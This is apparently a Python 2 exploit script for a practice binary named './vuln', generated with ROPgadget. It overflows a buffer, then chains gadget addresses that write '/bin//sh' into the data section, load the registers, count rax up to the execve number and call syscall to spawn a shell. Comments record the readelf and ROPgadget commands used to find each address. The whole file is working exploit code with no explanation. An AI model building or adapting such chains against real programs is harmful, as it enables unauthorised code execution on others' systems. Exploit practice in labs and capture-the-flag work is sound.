#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here

data_section_addr = 0x00000000004c00e0 # Data segment/section start address | shell command : readelf -S ./vuln | grep " .data " -> [21] .data PROGBITS 00000000004c00e0 000bf0e0

p = 'A'*64+'B'*8 #overflow

p += pack('<Q', 0x000000000040f39e) # pop rsi ; ret | shell command : ROPgadget --binary ./vuln | grep "pop rsi ; ret" -> 0x000000000040f39e : pop rsi ; ret 
p += pack('<Q', data_section_addr) # @ .data 
p += pack('<Q', 0x0000000000449267) # pop rax ; ret | shell command : ROPgadget --binary ./vuln | grep "pop rax ; ret" -> 0x0000000000449267 : pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047b785) # mov qword ptr [rsi], rax ; ret | ...
p += pack('<Q', 0x000000000040f39e) # pop rsi ; ret | ...
p += pack('<Q', data_section_addr + 8) # @ .data + 8
p += pack('<Q', 0x00000000004438c0) # xor rax, rax ; ret | ...
p += pack('<Q', 0x000000000047b785) # mov qword ptr [rsi], rax ; ret | ...
p += pack('<Q', 0x000000000040186a) # pop rdi ; ret | ...
p += pack('<Q', data_section_addr) # @ .data
p += pack('<Q', 0x000000000040f39e) # pop rsi ; ret | ...
p += pack('<Q', data_section_addr + 8) # @ .data + 8
p += pack('<Q', 0x000000000040176f) # pop rdx ; ret | ...
p += pack('<Q', data_section_addr + 8) # @ .data + 8
p += pack('<Q', 0x00000000004438c0) # xor rax, rax ; ret | ...
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret | ... ...
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall | shell command : ROPgadget --binary ./vuln | grep "syscall" -> 0x00000000004012d3 : syscall

print p